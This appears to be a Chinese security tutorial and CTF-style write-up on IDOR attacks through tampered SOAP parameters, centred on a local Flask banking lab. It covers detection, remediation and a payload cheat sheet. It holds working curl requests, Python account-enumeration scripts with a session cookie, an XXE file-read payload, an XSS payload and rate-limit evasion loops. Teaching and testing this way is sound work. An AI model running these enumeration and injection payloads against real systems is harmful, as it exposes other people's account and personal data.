# IDOR 通过 SOAP 参数篡改攻击

## 1. 技术概述

### 1.1 漏洞原理

IDOR（Insecure Direct Object Reference，不安全直接对象引用）通过 SOAP 参数篡改攻击是指攻击者通过修改 SOAP XML 请求中的对象标识符（如 `account_id`、`user_id` 等），访问未授权的资源。

**本质原因：**
- 应用仅验证用户认证状态，未验证资源所有权
- 对象标识符直接暴露且可预测
- 缺少对象级访问控制检查
- SOAP 参数完全由用户控制

### 1.2 常见漏洞模式

| 模式 | 描述 | 危险代码示例 |
|------|------|-------------|
| 无所有权检查 | 仅检查登录状态，不检查资源归属 | `@login_required` 但无 `@requires_ownership` |
| 直接对象引用 | 对象 ID 直接作为参数 | `account_id = root.find('.//account_id').text` |
| 静态数据返回 | 服务方法返回硬编码数据 | `return {'account_id': account_id, 'balance': '1000'}` |
| 批量枚举可能 | 无速率限制可枚举所有 ID | 无请求频率限制 |

### 1.3 适用范围

- SOAP Web Service 暴露对象标识符
- REST API 使用可预测资源 ID
- GraphQL API 接受任意对象 ID 参数
- 任何基于 ID 的资源访问控制场景

---

## 2. 攻击场景

### 2.1 适用目标系统

| 系统特征 | 风险描述 |
|----------|----------|
| SOAP 服务暴露账户/用户 ID | 可篡改 ID 访问他人数据 |
| 认证后访问资源 | 仅检查认证，不检查授权 |
| 可预测的对象 ID | ID 为数字或规律字符串 |
| 无访问控制日志 | 难以检测未授权访问 |

### 2.2 典型业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|----------|----------|-----------|
| **银行账户系统** | 查询账户余额、交易记录 | 修改 `account_id` 访问他人账户 |
| **电商平台** | 订单详情、用户资料 | 修改 `order_id`/`user_id` 访问他人数据 |
| **医疗系统** | 病历查询、检查结果 | 修改 `patient_id` 访问他人病历 |
| **教育系统** | 成绩查询、学籍信息 | 修改 `student_id` 访问他人成绩 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 输入点识别

关注以下功能点：
- SOAP 端点（`/soap`, `/service`, `/api/soap`）
- 对象 ID 参数（`account_id`, `user_id`, `order_id`）
- 资源查询接口（`GetAccountInfo`, `GetUserInfo`, `GetOrder`）

#### 3.1.2 初步探测 Payload

**基础 ID 篡改测试：**
```xml
<!-- 原始请求 -->
<GetAccountInfoRequest>
  <account_id>123456</account_id>
</GetAccountInfoRequest>

<!-- 篡改测试 -->
<GetAccountInfoRequest>
  <account_id>123457</account_id>
</GetAccountInfoRequest>
```

**批量枚举测试：**
```xml
<!-- 遍历账户 ID -->
<GetAccountInfoRequest>
  <account_id>100000</account_id>
</GetAccountInfoRequest>
<GetAccountInfoRequest>
  <account_id>100001</account_id>
</GetAccountInfoRequest>
<GetAccountInfoRequest>
  <account_id>100002</account_id>
</GetAccountInfoRequest>
```

#### 3.1.3 结果验证

**成功访问指标：**
- 返回 200 OK 状态码
- 返回有效的账户/资源数据
- 无 "Unauthorized" 或 "Access Denied" 错误
- 响应中包含敏感信息（余额、交易记录、个人信息）

**访问被拒指标：**
- 返回 401 Unauthorized 或 403 Forbidden
- 返回 "Access Denied" 或 "Not Authorized" 错误
- 返回空数据或默认数据

### 3.2 白盒测试

#### 3.2.1 代码审计关键词

**SOAP 服务危险模式：**
```python
# 危险模式 1：无所有权检查
@app.route('/soap_service', methods=['POST'])
@login_required  # 仅检查认证
def soap_service():
    xml_data = request.data
    root = etree.fromstring(xml_data, parser)
    
    if root.tag.endswith('GetAccountInfoRequest'):
        account_id = root.find('.//account_id').text  # 用户可控
        # 无所有权检查！
        response_data = service.get_account_info(account_id)
        return response

# 危险模式 2：服务方法无授权
class MyService:
    @staticmethod
    def get_account_info(account_id):
        # 直接返回数据，无所有权验证
        return {'account_id': account_id, 'balance': '1000 USD'}

# 危险模式 3：硬编码数据返回
def get_account_info(account_id):
    return {
        'account_id': account_id,  # 直接返回用户提供的 ID
        'balance': '1000 USD',
        'recent_transactions': ['Transaction1', 'Transaction2']
    }
```

#### 3.2.2 数据流追踪

1. 定位 SOAP 端点（`@app.route('/soap_service')`）
2. 追踪对象 ID 提取逻辑（`root.find('.//account_id').text`）
3. 检查服务方法调用（`service.get_account_info(account_id)`）
4. 验证是否存在所有权检查
5. 定位数据返回逻辑

---

## 4. 漏洞利用方法

### 4.1 水平权限提升

#### 4.1.1 账户数据访问

**目标环境：** Flask SOAP Banking Service

**步骤 1：认证登录**
```bash
curl -c cookies.txt -b cookies.txt \
  -d "username=john&password=password123" \
  "http://localhost:39111/login"
```

**步骤 2：访问自己账户（基线测试）**
```bash
curl -X POST "http://localhost:39111/soap_service" \
  -b cookies.txt \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<GetAccountInfoRequest>
  <account_id>123456</account_id>
</GetAccountInfoRequest>'

# 响应
<GetAccountInfoResponse>
    <account_id>123456</account_id>
    <balance>1000 USD</balance>
    <recent_transactions>
        <recent_transactions>Transaction 1</recent_transactions>
        <recent_transactions>Transaction 2</recent_transactions>
    </recent_transactions>
</GetAccountInfoResponse>
```

**步骤 3：篡改账户 ID 访问他人账户**
```bash
curl -X POST "http://localhost:39111/soap_service" \
  -b cookies.txt \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<GetAccountInfoRequest>
  <account_id>999999</account_id>
</GetAccountInfoRequest>'

# 响应（成功访问他人账户）
<GetAccountInfoResponse>
    <account_id>999999</account_id>
    <balance>5000 USD</balance>
    <recent_transactions>
        <recent_transactions>Large Transfer</recent_transactions>
        <recent_transactions>Wire Transfer</recent_transactions>
    </recent_transactions>
</GetAccountInfoResponse>
```

#### 4.1.2 批量账户枚举

**脚本化枚举：**
```python
#!/usr/bin/env python3
import requests

COOKIE = {'session': 'eyJ1c2VybmFtZSI6ImpvaG4ifQ.aQAXTQ.NKkbps4L2Z0dJyViUsIlYMehN9A'}
SOAP_URL = 'http://localhost:39111/soap_service'

def get_account_info(account_id):
    headers = {'Content-Type': 'application/xml'}
    data = f'''<?xml version="1.0"?>
<GetAccountInfoRequest>
  <account_id>{account_id}</account_id>
</GetAccountInfoRequest>'''
    
    response = requests.post(SOAP_URL, cookies=COOKIE, headers=headers, data=data)
    return response.text

# 枚举账户 ID 100000-100100
for account_id in range(100000, 100100):
    result = get_account_info(account_id)
    if 'balance' in result:  # 成功访问
        print(f"[+] Account {account_id} accessible")
        print(result)
```

### 4.2 敏感信息收集

#### 4.2.1 账户持有人信息

```bash
curl -X POST "http://localhost:39111/soap_service" \
  -b cookies.txt \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<GetAccountHolderInfoRequest>
  <account_id>999999</account_id>
</GetAccountHolderInfoRequest>'

# 响应
<GetAccountHolderInfoResponse>
    <account_id>999999</account_id>
    <name>Jane Smith</name>
    <email>jane.smith@example.com</email>
</GetAccountHolderInfoResponse>
```

#### 4.2.2 交易记录收集

```bash
curl -X POST "http://localhost:39111/soap_service" \
  -b cookies.txt \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<GetAccountInfoRequest>
  <account_id>999999</account_id>
</GetAccountInfoRequest>'

# 响应包含交易记录
<GetAccountInfoResponse>
    <recent_transactions>
        <recent_transactions>Wire Transfer $10,000</recent_transactions>
        <recent_transactions>ATM Withdrawal $500</recent_transactions>
        <recent_transactions>Online Purchase $2,500</recent_transactions>
    </recent_transactions>
</GetAccountInfoResponse>
```

### 4.3 组合攻击

#### 4.3.1 IDOR + XXE

**攻击链：**
1. 利用 IDOR 访问任意账户
2. 结合 XXE 读取服务器文件
3. 获取系统敏感信息

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<GetAccountInfoRequest>
  <account_id>&xxe;</account_id>
</GetAccountInfoRequest>
```

#### 4.3.2 IDOR + XSS

**攻击链：**
1. 利用 IDOR 注入恶意数据
2. 数据被前端渲染时触发 XSS
3. 窃取其他用户会话

```xml
<GetAccountInfoRequest>
  <account_id><![CDATA[<img src=x onerror=alert(document.domain)>]]></account_id>
</GetAccountInfoRequest>
```

---

## 5. 绕过技术

### 5.1 访问控制绕过

#### 5.1.1 间接对象引用

如果应用使用间接引用（如哈希 ID）：
```python
# 尝试映射间接 ID 到真实 ID
# 通过创建多个账户观察 ID 模式
```

#### 5.1.2 UUID/GUID 绕过

如果应用使用 UUID：
```bash
# 尝试常见 UUID 模式
# 如时间戳 + 固定后缀
# 或使用 UUID 枚举工具
```

### 5.2 速率限制绕过

#### 5.2.1 请求延迟

```python
import time
import random

for account_id in range(100000, 100100):
    result = get_account_info(account_id)
    time.sleep(random.uniform(1, 3))  # 随机延迟 1-3 秒
```

#### 5.2.2 多账户轮换

```python
# 使用多个账户轮换请求
cookies_list = [cookie1, cookie2, cookie3]

for i, account_id in enumerate(range(100000, 100100)):
    cookie = cookies_list[i % len(cookies_list)]
    result = get_account_info(account_id, cookie)
```

---

## 6. 实战案例

### 6.1 Flask SOAP Banking Service 利用

**目标环境：**
- Flask 应用运行在 `http://localhost:39111`
- SOAP 端点：`/soap_service`
- 认证要求：需要登录（弱凭证 `john:password123`）
- 漏洞：无账户所有权检查

**攻击步骤：**

**步骤 1：获取认证会话**
```bash
curl -c cookies.txt -b cookies.txt \
  -d "username=john&password=password123" \
  "http://localhost:39111/login"
```

**步骤 2：基线测试（访问自己账户）**
```bash
curl -X POST "http://localhost:39111/soap_service" \
  -b cookies.txt \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<GetAccountInfoRequest>
  <account_id>123456</account_id>
</GetAccountInfoRequest>'
```

**步骤 3：水平权限提升（访问他人账户）**
```bash
# 尝试不同账户 ID
for id in 123457 123458 123459 999999; do
  echo "=== Testing account $id ==="
  curl -X POST "http://localhost:39111/soap_service" \
    -b cookies.txt \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?>
<GetAccountInfoRequest>
  <account_id>$id</account_id>
</GetAccountInfoRequest>"
  echo
done
```

**步骤 4：批量枚举脚本**
```python
#!/usr/bin/env python3
"""
IDOR Enumeration Script for Flask SOAP Banking Service
"""
import requests
import xml.etree.ElementTree as ET

COOKIE = {'session': 'eyJ1c2VybmFtZSI6ImpvaG4ifQ.aQAXTQ.NKkbps4L2Z0dJyViUsIlYMehN9A'}
SOAP_URL = 'http://localhost:39111/soap_service'

def parse_account_info(xml_response):
    """解析 XML 响应提取账户信息"""
    try:
        root = ET.fromstring(xml_response)
        ns = {'soap': 'http://schemas.xmlsoap.org/soap/envelope/'}
        
        # 尝试不同命名空间
        account_id = root.find('.//account_id')
        balance = root.find('.//balance')
        name = root.find('.//name')
        email = root.find('.//email')
        
        return {
            'account_id': account_id.text if account_id else 'N/A',
            'balance': balance.text if balance else 'N/A',
            'name': name.text if name else 'N/A',
            'email': email.text if email else 'N/A'
        }
    except Exception as e:
        return {'error': str(e)}

def get_account_info(account_id):
    """获取账户信息"""
    headers = {'Content-Type': 'application/xml'}
    data = f'''<?xml version="1.0"?>
<GetAccountInfoRequest>
  <account_id>{account_id}</account_id>
</GetAccountInfoRequest>'''
    
    response = requests.post(SOAP_URL, cookies=COOKIE, headers=headers, data=data)
    return parse_account_info(response.text)

# 枚举账户 ID
print("[*] Starting IDOR enumeration...")
for account_id in range(100000, 100100):
    result = get_account_info(account_id)
    if 'error' not in result:
        print(f"[+] Account {account_id}: {result}")
```

**步骤 5：获取 Flag（如果挑战要求）**
```bash
# 结合 XXE 读取 Flag
curl -X POST "http://localhost:39111/soap_service" \
  -b cookies.txt \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<GetAccountInfoRequest>
  <account_id>&xxe;</account_id>
</GetAccountInfoRequest>'
```

---

## 7. 检测清单

### 7.1 自动化检测

- [ ] 使用 Burp Suite Autorize 插件检测 IDOR
- [ ] 使用 OWASP ZAP 访问控制测试
- [ ] 使用自定义脚本批量枚举对象 ID
- [ ] 使用 API 安全扫描工具

### 7.2 手工检测

- [ ] 测试修改对象 ID 是否可访问他人数据
- [ ] 测试不同用户之间的数据隔离
- [ ] 测试批量枚举可能性
- [ ] 测试访问控制日志记录

---

## 8. 修复建议

### 8.1 实现所有权检查

```python
# 安全做法：添加所有权验证
user_accounts = {
    'john': ['123456'],  # John 只拥有账户 123456
    'jane': ['789012']   # Jane 拥有账户 789012
}

def requires_account_ownership(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        account_id = extract_account_id_from_request()
        username = session.get('username')
        
        # 检查账户所有权
        if account_id not in user_accounts.get(username, []):
            return app.response_class(
                response='<error>Unauthorized access</error>',
                status=403
            )
        return f(*args, **kwargs)
    return decorated_function

# 应用装饰器
@app.route('/soap_service', methods=['POST'])
@login_required
@requires_account_ownership
def soap_service():
    # ... 处理逻辑
```

### 8.2 使用间接对象引用

```python
# 安全做法：使用间接 ID 映射
import hashlib
import secrets

# 生成随机映射 ID
def generate_indirect_id(account_id):
    secret = app.config['SECRET_KEY']
    return hashlib.sha256(f"{secret}:{account_id}".encode()).hexdigest()

# 验证间接 ID
def verify_indirect_id(indirect_id, username):
    # 查询数据库验证所有权
    account = db.query(Account).filter_by(
        indirect_id=indirect_id,
        owner_username=username
    ).first()
    return account
```

### 8.3 添加访问控制日志

```python
import logging
from datetime import datetime

@app.route('/soap_service', methods=['POST'])
@login_required
def soap_service():
    account_id = extract_account_id()
    username = session['username']
    
    # 记录访问日志
    logging.info(
        f"[{datetime.now()}] User {username} accessed account {account_id}"
    )
    
    # 检查所有权
    if not owns_account(username, account_id):
        logging.warning(
            f"[{datetime.now()}] Unauthorized access attempt: "
            f"{username} -> {account_id}"
        )
        return '<error>Unauthorized</error>', 403
    
    # ... 正常处理
```

---

## 9. Payload 速查表

### 9.1 基础 IDOR Payload

| Payload | 描述 |
|---------|------|
| `<account_id>123457</account_id>` | 修改账户 ID |
| `<user_id>999</user_id>` | 修改用户 ID |
| `<order_id>1001</order_id>` | 修改订单 ID |
| `<patient_id>P12345</patient_id>` | 修改患者 ID |

### 9.2 批量枚举 Payload

| 范围 | 描述 |
|------|------|
| `100000-100100` | 枚举 6 位数字 ID |
| `1-1000` | 枚举小数字 ID |
| `admin/root/test` | 枚举常见用户名 |
| `UUID 模式` | 枚举 UUID/GUID |

### 9.3 组合攻击 Payload

| Payload | 描述 |
|---------|------|
| `IDOR + XXE` | 访问他人数据 + 读取服务器文件 |
| `IDOR + XSS` | 注入恶意数据 + 触发 XSS |
| `IDOR + SQL 注入` | 访问他人数据 + SQL 注入 |

---

## 10. 参考资源

- [OWASP IDOR](https://owasp.org/www-community/vulnerabilities/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet)
- [PortSwigger - IDOR](https://portswigger.net/web-security/access-control/idor)
- [OWASP Access Control](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
- [Broken Object Level Authorization (API Security)](https://owasp.org/API-Security/editions/2023/en/01-broken-object-level-authorization/)
